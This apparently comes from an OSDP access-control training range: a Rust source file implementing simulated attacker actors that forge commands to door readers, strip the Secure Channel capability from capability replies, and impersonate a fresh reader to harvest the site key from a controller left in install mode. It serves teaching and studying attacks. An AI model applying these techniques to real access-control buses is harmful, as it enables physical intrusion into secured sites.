//! **The attacker who talks.**
//!
//! Three actors that put frames on the bus. Two of them are loud — an injector
//! collides with whatever else is transmitting, an inline implant cuts the
//! cable — and the third, [`InstallModeHarvester`], is the interesting one: it
//! sends nothing but well-formed protocol answers and the controller gives it
//! the site key.
//!
//! | Actor | Position | Curriculum |
//! |---|---|---|
//! | [`Injector`] | injecting | 2.3 |
//! | [`Downgrader`] | inline | 3.6 |
//! | [`InstallModeHarvester`] | injecting | 3.4 |

use alloc::boxed::Box;
use alloc::rc::Rc;
use alloc::string::{String, ToString};
use alloc::vec::Vec;
use core::cell::RefCell;

use odr_bus::{
    default_capabilities, BusDir, InjectingTap, Injection, InjectionPayload, InlineTap, LinkId,
    LogRecord, Micros, Observation, Origin, RecordKind, TapCtx, TapId, TapKind, TapPosition, World,
};
use odr_osdp::codes::{Command, Reply};
use odr_osdp::payload::{KeysetCommand, PdCapabilities, PdId};
use odr_osdp::security::KeyType;
use odr_osdp::{Frame, SecureChannel, SCBK_D};

use crate::error::{AttackError, Result};
use crate::knowledge::{KnowledgeCell, Known, ObservedFrame, Provenance, RecoveredKey};
use crate::osdp_passive::addresses_in;
use crate::Attacker;

// ---------------------------------------------------------------------------
// Injector
// ---------------------------------------------------------------------------

/// **Nothing authenticates the controller, so send your own commands.**
///
/// On an unsecured bus a peripheral has no way to tell a command from its
/// controller apart from a command from a laptop with a nine-pound RS-485
/// dongle, because there is nothing in the frame that identifies the sender.
/// Sequence number zero makes it easier still: it is the protocol's "I have
/// just started, accept me without checking", and every PD honours it from
/// anybody.
///
/// The one real constraint is the medium. RS-485 is half duplex and shared, so
/// an injector that transmits while the controller is talking destroys both
/// frames and gets a [`RecordKind::BusCollision`] for its trouble. Finding the
/// gap is the actual skill, and the engine models it.
///
/// Curriculum drill 2.3's flag is "the PD ACKs a command originated by the
/// attacker actor", which is a question about the event log's cause chain
/// rather than about this actor's own claims — see [`Injector::acknowledged`].
pub struct Injector {
    name: String,
    knowledge: KnowledgeCell,
    tap: Option<TapId>,
    consumed: usize,
    sent: usize,
}

impl core::fmt::Debug for Injector {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.debug_struct("Injector")
            .field("name", &self.name)
            .field("tap", &self.tap)
            .field("sent", &self.sent)
            .finish()
    }
}

impl Injector {
    /// An injector with a knowledge base of its own.
    pub fn new(name: impl Into<String>) -> Injector {
        Injector::sharing(name, KnowledgeCell::new())
    }

    /// An injector pooling what it learns with other actors.
    pub fn sharing(name: impl Into<String>, knowledge: KnowledgeCell) -> Injector {
        Injector {
            name: name.into(),
            knowledge,
            tap: None,
            consumed: 0,
            sent: 0,
        }
    }

    /// Clip it onto a bus.
    pub fn attach(&mut self, world: &mut World, link: LinkId) -> Result<TapId> {
        let id = world.add_tap(link, Box::new(InjectingTap::new(self.name.clone())))?;
        self.tap = Some(id);
        Ok(id)
    }

    /// Learn from what the bus has been saying: which addresses answer, and
    /// what the traffic looks like.
    pub fn harvest(&mut self, world: &World) -> Result<usize> {
        let tap = self.tap.ok_or_else(|| AttackError::NotAttached {
            actor: self.name.clone(),
        })?;
        let seen = world.tap(tap)?.seen();
        let mut frames = Vec::new();
        let mut addresses = Vec::new();
        for s in seen.iter().skip(self.consumed) {
            let (Some(dir), Some(frame)) = (s.dir, s.frame()) else {
                continue;
            };
            if frame.is_reply {
                addresses.push(Known::observed(frame.address, s.t_us, Some(tap)));
            }
            frames.push(Known::observed(
                ObservedFrame {
                    t_us: s.t_us,
                    dir,
                    frame,
                },
                s.t_us,
                Some(tap),
            ));
        }
        self.consumed = seen.len();
        let n = frames.len();
        self.knowledge.update(|k| {
            for a in addresses {
                if !k.addresses.iter().any(|x| x.value == a.value) {
                    k.addresses.push(a);
                }
            }
            k.frames.extend(frames);
        });
        Ok(n)
    }

    /// The addresses this injector has heard answering.
    pub fn observed_addresses(&self) -> Vec<u8> {
        self.knowledge
            .read(|k| k.addresses.iter().map(|a| a.value).collect())
            .unwrap_or_default()
    }

    /// Put a frame of your own on the bus.
    pub fn send(
        &mut self,
        world: &mut World,
        at_us: Micros,
        dir: BusDir,
        frame: Frame,
    ) -> Result<()> {
        let tap = self.tap.ok_or_else(|| AttackError::NotAttached {
            actor: self.name.clone(),
        })?;
        world.inject(tap, Injection::bus_frame(at_us, dir, frame))?;
        self.sent += 1;
        Ok(())
    }

    /// Forge a command to an address the injector has actually heard answering.
    ///
    /// # Errors
    /// [`AttackError::Unearned`] if it has heard nothing. An attacker that has
    /// not listened does not know what to address, and the range should not
    /// pretend otherwise.
    pub fn forge(
        &mut self,
        world: &mut World,
        at_us: Micros,
        address: u8,
        command: Command,
        payload: Vec<u8>,
    ) -> Result<()> {
        if !self.observed_addresses().contains(&address) {
            return Err(AttackError::Unearned {
                wanted: "a PD address to forge a command to",
                detail: "this address has never been heard answering on the bus".to_string(),
            });
        }
        // Sequence 0: "I have just started." No key, no credential, no cloning.
        let frame = Frame::command(address, 0, command, payload);
        self.send(world, at_us, BusDir::AcuToPd, frame)
    }

    /// Forge a command to the first address heard answering.
    pub fn forge_to_any(
        &mut self,
        world: &mut World,
        at_us: Micros,
        command: Command,
        payload: Vec<u8>,
    ) -> Result<u8> {
        let address = *self
            .observed_addresses()
            .first()
            .ok_or(AttackError::Unearned {
                wanted: "a PD address to forge a command to",
                detail: "the injector has not heard anything answer yet".to_string(),
            })?;
        self.forge(world, at_us, address, command, payload)?;
        Ok(address)
    }

    /// How many frames this injector has transmitted.
    pub fn sent(&self) -> usize {
        self.sent
    }

    /// **Replies the PD sent because of this injector.**
    ///
    /// Answered by the world's cause chain, not by the injector: a reply's
    /// [`odr_bus::EventLog::originator`] is the transmission that provoked it,
    /// and a match against this tap means the PD answered a frame the attacker
    /// forged.
    pub fn acknowledged<'a>(&self, world: &'a World) -> Vec<&'a LogRecord> {
        let Some(tap) = self.tap else {
            return Vec::new();
        };
        world
            .log()
            .records()
            .iter()
            .filter(|r| matches!(&r.kind, RecordKind::BusTx { frame: Some(f), .. } if f.is_reply))
            .filter(|r| world.log().originator(r.seq) == Some(Origin::Tap(tap)))
            .collect()
    }

    /// True if a PD answered anything this injector sent.
    pub fn was_answered(&self, world: &World) -> bool {
        !self.acknowledged(world).is_empty()
    }

    /// True if a PD sent a positive acknowledgement — not a NAK — to something
    /// this injector sent.
    pub fn was_acked(&self, world: &World) -> bool {
        self.acknowledged(world).iter().any(|r| {
            matches!(&r.kind, RecordKind::BusTx { frame: Some(f), .. }
                if f.reply_code() == Some(Reply::Ack))
        })
    }
}

impl Attacker for Injector {
    fn name(&self) -> &str {
        &self.name
    }
    fn position(&self) -> TapKind {
        TapKind::Injecting
    }
    fn knowledge(&self) -> &KnowledgeCell {
        &self.knowledge
    }
    fn tap(&self) -> Option<TapId> {
        self.tap
    }
}

// ---------------------------------------------------------------------------
// Downgrader
// ---------------------------------------------------------------------------

#[derive(Debug, Default)]
struct DowngradeState {
    rewrites: usize,
    seen_claiming_aes: usize,
    before: Vec<PdCapabilities>,
    after: Vec<PdCapabilities>,
}

/// **Mellon attack 2: make the reader say it cannot do crypto.**
///
/// The controller decides whether to run a Secure Channel handshake from the
/// PD's capability reply — a frame sent *before any key material exists*, with
/// nothing protecting it. An inline implant that removes one three-byte entry
/// from that reply makes a modern, AES-capable, correctly-keyed reader look
/// like a legacy one, and the controller then talks to it in the clear.
///
/// The sharp part is that this works against a controller configured to
/// **require** Secure Channel, because "required" in this class of product
/// means "required of readers that support it"
/// ([`odr_bus::AcuConfig::trust_pdcap`]). That sentence is the vulnerability.
///
/// The implant is four lines of policy on top of
/// [`InlineTap::rewrite_frames`], and returning `false` for every other frame
/// passes the original bytes through untouched, CRC and all — so nothing else
/// on the bus is disturbed and there is no timing signature to find.
///
/// It has to happen **before** the handshake. Replacing a frame that carried a
/// MAC does not recompute the MAC, because the tap has no session key; the
/// capability exchange is attackable precisely because it is the part with no
/// key yet.
pub struct Downgrader {
    name: String,
    knowledge: KnowledgeCell,
    tap: Option<TapId>,
    state: Rc<RefCell<DowngradeState>>,
}

impl core::fmt::Debug for Downgrader {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.debug_struct("Downgrader")
            .field("name", &self.name)
            .field("tap", &self.tap)
            .field("rewrites", &self.rewrites())
            .finish()
    }
}

impl Downgrader {
    /// A downgrader with a knowledge base of its own.
    pub fn new(name: impl Into<String>) -> Downgrader {
        Downgrader::sharing(name, KnowledgeCell::new())
    }

    /// A downgrader pooling what it learns with other actors.
    pub fn sharing(name: impl Into<String>, knowledge: KnowledgeCell) -> Downgrader {
        Downgrader {
            name: name.into(),
            knowledge,
            tap: None,
            state: Rc::new(RefCell::new(DowngradeState::default())),
        }
    }

    /// Cut the bus at the controller end — between the panel and every
    /// peripheral, which is where a downgrade wants to be.
    pub fn attach(&mut self, world: &mut World, link: LinkId) -> Result<TapId> {
        self.attach_at(world, link, TapPosition::default())
    }

    /// Cut the bus at a chosen position.
    pub fn attach_at(
        &mut self,
        world: &mut World,
        link: LinkId,
        position: TapPosition,
    ) -> Result<TapId> {
        let state = self.state.clone();
        let knowledge = self.knowledge.clone();
        let implant = InlineTap::rewrite_frames(self.name.clone(), move |frame| {
            if frame.reply_code() != Some(Reply::PdCap) {
                return false;
            }
            let Ok(mut caps) = PdCapabilities::decode(&frame.payload) else {
                return false;
            };
            let before = caps.clone();
            let changed = caps.strip_security_capability();
            frame.payload = caps.encode();
            if changed {
                if let Ok(mut st) = state.try_borrow_mut() {
                    st.rewrites += 1;
                    if before.claims_aes128() {
                        st.seen_claiming_aes += 1;
                    }
                    st.before.push(before);
                    st.after.push(caps);
                }
                knowledge.update(|k| {
                    k.notes
                        .push("stripped the communication-security entry from a PDCAP reply".into())
                });
            }
            changed
        });
        let id = world.add_tap_at(link, Box::new(implant), position)?;
        self.tap = Some(id);
        Ok(id)
    }

    /// How many capability replies have been rewritten.
    pub fn rewrites(&self) -> usize {
        self.state.try_borrow().map(|s| s.rewrites).unwrap_or(0)
    }

    /// How many of those really did claim AES-128 before the implant got to
    /// them — which is what tells a genuine downgrade apart from an implant
    /// sitting in front of a reader that never claimed anything.
    pub fn genuinely_downgraded(&self) -> usize {
        self.state
            .try_borrow()
            .map(|s| s.seen_claiming_aes)
            .unwrap_or(0)
    }

    /// The capability reports before and after, for the UI's diff view.
    pub fn rewritten(&self) -> Vec<(PdCapabilities, PdCapabilities)> {
        self.state
            .try_borrow()
            .map(|s| {
                s.before
                    .iter()
                    .cloned()
                    .zip(s.after.iter().cloned())
                    .collect()
            })
            .unwrap_or_default()
    }
}

impl Attacker for Downgrader {
    fn name(&self) -> &str {
        &self.name
    }
    fn position(&self) -> TapKind {
        TapKind::Inline
    }
    fn knowledge(&self) -> &KnowledgeCell {
        &self.knowledge
    }
    fn tap(&self) -> Option<TapId> {
        self.tap
    }
}

// ---------------------------------------------------------------------------
// InstallModeHarvester
// ---------------------------------------------------------------------------

/// What an [`InstallModeHarvester`] managed to do.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HarvestOutcome {
    /// The site keys the controller handed over.
    pub keys: Vec<[u8; 16]>,
    /// How many frames the harvester transmitted.
    pub frames_sent: usize,
    /// How many commands it answered.
    pub commands_answered: usize,
    /// Whether it reached an established Secure Channel with the controller.
    pub channel_established: bool,
}

#[derive(Debug, Default)]
struct HarvesterState {
    channel: Option<SecureChannel>,
    secure: bool,
    keys: Vec<[u8; 16]>,
    frames_sent: usize,
    commands_answered: usize,
    /// The key the channel is currently keyed with. It starts as the published
    /// default and becomes the site key once the controller has handed it over.
    key: [u8; 16],
    key_type_default: bool,
}

/// **Mellon attack 3: a controller left in install mode hands out the site
/// key.**
///
/// Commissioning an OSDP peripheral means meeting it on the published default
/// key SCBK-D — because that is the only key a fresh reader has — and then
/// pushing the site key to it with `CMD_KEYSET`. A controller left in install
/// mode after the installer went home will do that for **anything that turns
/// up at an unused address claiming to be a fresh reader**.
///
/// So the attack is: be a reader. This actor answers the controller's polls
/// with well-formed replies — `REPLY_PDID`, a `REPLY_PDCAP` that claims AES-128
/// and admits to the default key, and the PD half of the four-frame handshake
/// under SCBK-D. Every value it needs is either in the frame it is answering or
/// published in the specification. The controller then sends it the site key
/// for the whole installation, and it decrypts it under SCBK-D.
///
/// Curriculum drill 3.4's flag is "attacker holds the SCBK and the only frames
/// it sent were legitimate protocol requests". Every frame this actor
/// transmits is a valid OSDP reply to the command immediately preceding it; it
/// forges nothing, malforms nothing, and never speaks out of turn. The attack
/// is entirely in *being there*.
///
/// # Where to put it
///
/// At an address the controller polls and no real peripheral answers. Two
/// transmitters on one RS-485 segment destroy each other, so an address with a
/// genuine reader on it is not a target — it is a collision.
pub struct InstallModeHarvester {
    name: String,
    knowledge: KnowledgeCell,
    tap: Option<TapId>,
    state: Rc<RefCell<HarvesterState>>,
    address: u8,
    cuid: [u8; 8],
    reply_delay_us: Micros,
    mac_len: u8,
}

impl core::fmt::Debug for InstallModeHarvester {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.debug_struct("InstallModeHarvester")
            .field("name", &self.name)
            .field("tap", &self.tap)
            .field("address", &self.address)
            .finish()
    }
}

impl InstallModeHarvester {
    /// A harvester that will answer for `address`.
    pub fn new(name: impl Into<String>, address: u8) -> InstallModeHarvester {
        InstallModeHarvester::sharing(name, KnowledgeCell::new(), address)
    }

    /// A harvester pooling what it learns with other actors.
    pub fn sharing(
        name: impl Into<String>,
        knowledge: KnowledgeCell,
        address: u8,
    ) -> InstallModeHarvester {
        InstallModeHarvester {
            name: name.into(),
            knowledge,
            tap: None,
            state: Rc::new(RefCell::new(HarvesterState {
                key: SCBK_D,
                key_type_default: true,
                ..HarvesterState::default()
            })),
            address: address & 0x7F,
            cuid: [0x0D, 0xEF, 0xAC, 0xED, 0x00, 0x00, 0x00, 0x01],
            reply_delay_us: 2_000,
            mac_len: 4,
        }
    }

    /// How long after a command the fake reader answers. Real peripherals take
    /// a millisecond or two; answering instantly would be a signature.
    pub fn with_reply_delay(mut self, us: Micros) -> InstallModeHarvester {
        self.reply_delay_us = us;
        self
    }

    /// Match the bus's MAC width. See [`crate::WeakKeyCracker::with_mac_len`].
    pub fn with_mac_len(mut self, mac_len: u8) -> InstallModeHarvester {
        self.mac_len = mac_len.clamp(1, 4);
        self
    }

    /// The identifier the fake reader answers `REPLY_CCRYPT` with.
    pub fn with_cuid(mut self, cuid: [u8; 8]) -> InstallModeHarvester {
        self.cuid = cuid;
        self
    }

    /// Clip it onto the bus.
    pub fn attach(&mut self, world: &mut World, link: LinkId) -> Result<TapId> {
        let state = self.state.clone();
        let knowledge = self.knowledge.clone();
        let address = self.address;
        let cuid = self.cuid;
        let delay = self.reply_delay_us;
        let mac_len = self.mac_len;

        let tap = InjectingTap::reacting(
            self.name.clone(),
            move |ctx: &mut TapCtx<'_>, obs: &Observation<'_>| {
                // Only commands, only for our address, and never our own
                // transmissions — which are replies, so the first test covers
                // them anyway.
                let Some(frame) = obs.frame() else { return };
                if frame.is_reply || frame.address != address {
                    return;
                }
                if obs.dir() != Some(BusDir::AcuToPd) {
                    return;
                }
                let now = ctx.now();
                // The PD's nonce, drawn from the world's seeded generator so
                // the attack is reproducible. Only a challenge needs one.
                let rnd_b = if frame.command_code() == Some(Command::Chlng) {
                    Some(ctx.rng().nonce8())
                } else {
                    None
                };
                let reply = {
                    let mut st = match state.try_borrow_mut() {
                        Ok(s) => s,
                        Err(_) => return,
                    };
                    st.commands_answered += 1;
                    answer_as_a_fresh_reader(&mut st, frame, cuid, mac_len, &knowledge, rnd_b)
                };
                if let Some(f) = reply {
                    if let Ok(mut st) = state.try_borrow_mut() {
                        st.frames_sent += 1;
                    }
                    ctx.inject_at(
                        now.saturating_add(delay),
                        InjectionPayload::BusFrame {
                            dir: BusDir::PdToAcu,
                            frame: Box::new(f),
                        },
                    );
                }
            },
        );
        let id = world.add_tap(link, Box::new(tap))?;
        self.tap = Some(id);
        Ok(id)
    }

    /// What it got.
    pub fn outcome(&self) -> HarvestOutcome {
        self.state
            .try_borrow()
            .map(|s| HarvestOutcome {
                keys: s.keys.clone(),
                frames_sent: s.frames_sent,
                commands_answered: s.commands_answered,
                channel_established: s.secure,
            })
            .unwrap_or(HarvestOutcome {
                keys: Vec::new(),
                frames_sent: 0,
                commands_answered: 0,
                channel_established: false,
            })
    }

    /// The site keys the controller handed over.
    pub fn keys(&self) -> Vec<[u8; 16]> {
        self.outcome().keys
    }

    /// True if the controller has handed over a key that is not the published
    /// default — which is the whole point: SCBK-D is already public.
    pub fn holds_a_site_key(&self) -> bool {
        self.keys().iter().any(|k| *k != SCBK_D)
    }

    /// The address it is answering for.
    pub fn address(&self) -> u8 {
        self.address
    }
}

/// The PD half of the protocol, played by an attacker with nothing but the
/// published default key.
///
/// Every branch is a legitimate answer to the command it received. There is no
/// forgery here and no malformed frame; the attack is that the controller never
/// asks who it is talking to.
fn answer_as_a_fresh_reader(
    st: &mut HarvesterState,
    frame: &Frame,
    cuid: [u8; 8],
    mac_len: u8,
    knowledge: &KnowledgeCell,
    rnd_b: Option<[u8; 8]>,
) -> Option<Frame> {
    let address = frame.address;
    let seq = frame.sequence & 0x03;

    // Sequence zero means the controller has restarted. A real PD drops its
    // session; so does this one.
    if seq == 0 {
        st.channel = None;
        st.secure = false;
    }

    // A secured frame has to be opened before it can be answered.
    let secured_in = frame.scs_type().is_some_and(|s| s.has_mac());
    let plaintext = if secured_in {
        match st.channel.as_mut().map(|c| c.open(frame)) {
            Some(Ok(p)) => p,
            _ => return None,
        }
    } else {
        frame.payload.clone()
    };

    match frame.command_code() {
        Some(Command::Id) => {
            // An ordinary-looking identity. Nothing checks it.
            let id = PdId {
                vendor_code: [0x00, 0x4F, 0x44],
                model: 1,
                version: 1,
                serial_number: [0xDE, 0xAD, 0xBE, 0xEF],
                firmware_major: 1,
                firmware_minor: 0,
                firmware_build: 0,
            };
            Some(seal_or_plain(st, address, seq, Reply::PdId, id.encode()))
        }
        Some(Command::Cap) => {
            // Claim AES-128, and admit to the default key. The second half is
            // what makes a controller in install mode decide this reader needs
            // commissioning.
            let caps = default_capabilities(true, true);
            Some(seal_or_plain(st, address, seq, Reply::PdCap, caps.encode()))
        }
        Some(Command::Chlng) => {
            // SCBK-D is published in the specification. Using it is not a
            // compromise of anything.
            let mut channel =
                SecureChannel::pd(st.key, key_type_of(st), cuid).with_mac_len(mac_len);
            match channel.handle_challenge(frame, rnd_b?) {
                Ok(reply) => {
                    st.channel = Some(channel);
                    st.secure = false;
                    Some(reply)
                }
                Err(_) => None,
            }
        }
        Some(Command::Scrypt) => match st.channel.as_mut() {
            Some(c) => match c.handle_scrypt(frame) {
                Ok(reply) => {
                    st.secure = true;
                    Some(reply)
                }
                Err(_) => None,
            },
            None => None,
        },
        Some(Command::Keyset) => {
            // The payload of this frame is the site key for the installation,
            // encrypted under a key everybody has.
            if let Some(key) = KeysetCommand::decode(&plaintext)
                .ok()
                .and_then(|k| k.as_aes128())
            {
                if !st.keys.contains(&key) {
                    st.keys.push(key);
                }
                knowledge.update(|k| {
                    k.keys.push(Known::new(
                        RecoveredKey::scbk(key, Some(address)),
                        Provenance::Derived {
                            from: "a CMD_KEYSET the controller volunteered, \
                                   decrypted under the published default key SCBK-D",
                        },
                    ));
                    k.notes.push(
                        "the controller was in install mode and handed over its site key".into(),
                    );
                });
                // A real PD answers, adopts the key, and expects the next
                // handshake under it. So does this one.
                let ack = seal_or_plain(st, address, seq, Reply::Ack, Vec::new());
                st.key = key;
                st.key_type_default = false;
                st.channel = None;
                st.secure = false;
                return Some(ack);
            }
            None
        }
        Some(Command::Poll) => Some(seal_or_plain(st, address, seq, Reply::Ack, Vec::new())),
        Some(_) => Some(seal_or_plain(st, address, seq, Reply::Ack, Vec::new())),
        None => None,
    }
}

fn key_type_of(st: &HarvesterState) -> KeyType {
    if st.key_type_default {
        KeyType::Default
    } else {
        KeyType::SiteKey
    }
}

fn seal_or_plain(
    st: &mut HarvesterState,
    address: u8,
    seq: u8,
    reply: Reply,
    payload: Vec<u8>,
) -> Frame {
    if st.secure {
        if let Some(c) = st.channel.as_mut() {
            if let Ok(f) = c.seal(address, seq, reply.to_u8(), &payload, true) {
                return f;
            }
        }
    }
    Frame::reply(address, seq, reply, payload)
}

impl Attacker for InstallModeHarvester {
    fn name(&self) -> &str {
        &self.name
    }
    fn position(&self) -> TapKind {
        TapKind::Injecting
    }
    fn knowledge(&self) -> &KnowledgeCell {
        &self.knowledge
    }
    fn tap(&self) -> Option<TapId> {
        self.tap
    }
}

/// Every frame a tap transmitted, taken from the world's event log.
///
/// Curriculum 3.4 asks whether the attacker sent anything other than legitimate
/// protocol traffic, and that is a question about what is in the log rather
/// than about what the actor says it did.
pub fn frames_sent_by(world: &World, tap: TapId) -> Vec<Frame> {
    world
        .log()
        .injected_by(tap)
        .filter_map(|r| r.frame().cloned())
        .collect()
}

/// The addresses a capture shows answering, for an injector choosing a target.
pub fn targets_in(frames: &[ObservedFrame]) -> Vec<u8> {
    addresses_in(frames)
}

#[cfg(test)]
mod tests {
    use super::*;
    use odr_osdp::payload::Nak;

    #[test]
    fn a_downgrader_starts_having_changed_nothing() {
        let d = Downgrader::new("implant");
        assert_eq!(d.rewrites(), 0);
        assert_eq!(d.genuinely_downgraded(), 0);
        assert!(d.rewritten().is_empty());
        assert!(d.tap().is_none());
    }

    #[test]
    fn an_injector_with_nothing_heard_refuses_to_guess_a_target() {
        let injector = Injector::new("laptop");
        assert!(injector.observed_addresses().is_empty());
        assert_eq!(injector.sent(), 0);
    }

    #[test]
    fn the_fake_reader_answers_id_and_cap_the_way_a_fresh_one_would() {
        let mut st = HarvesterState {
            key: SCBK_D,
            key_type_default: true,
            ..HarvesterState::default()
        };
        let knowledge = KnowledgeCell::new();

        let id = answer_as_a_fresh_reader(
            &mut st,
            &Frame::command(0x02, 1, Command::Id, Vec::new()),
            [0xAA; 8],
            4,
            &knowledge,
            None,
        )
        .expect("a PD answers CMD_ID");
        assert_eq!(id.reply_code(), Some(Reply::PdId));
        assert!(id.is_reply);
        assert_eq!(id.address, 0x02);

        let cap = answer_as_a_fresh_reader(
            &mut st,
            &Frame::command(0x02, 2, Command::Cap, Vec::new()),
            [0xAA; 8],
            4,
            &knowledge,
            None,
        )
        .expect("a PD answers CMD_CAP");
        let caps = PdCapabilities::decode(&cap.payload).unwrap();
        assert!(
            caps.claims_aes128(),
            "it has to look capable or it is not worth commissioning"
        );
        assert!(
            caps.uses_default_key(),
            "and it has to admit to the default key or it is not worth a keyset"
        );
    }

    #[test]
    fn a_harvester_that_has_been_told_nothing_holds_nothing() {
        let h = InstallModeHarvester::new("laptop", 0x02);
        let outcome = h.outcome();
        assert!(outcome.keys.is_empty());
        assert_eq!(outcome.frames_sent, 0);
        assert!(!outcome.channel_established);
        assert!(!h.holds_a_site_key());
        assert_eq!(h.address(), 0x02);
        assert!(h.knowledge().snapshot().is_honest());
    }

    #[test]
    fn a_nak_is_not_an_acknowledgement() {
        // The distinction `Injector::was_acked` rests on.
        let nak = Frame::reply(
            1,
            1,
            Reply::Nak,
            Nak::new(odr_osdp::payload::NakError::UnknownCommand).encode(),
        );
        assert_eq!(nak.reply_code(), Some(Reply::Nak));
        assert_ne!(nak.reply_code(), Some(Reply::Ack));
    }
}
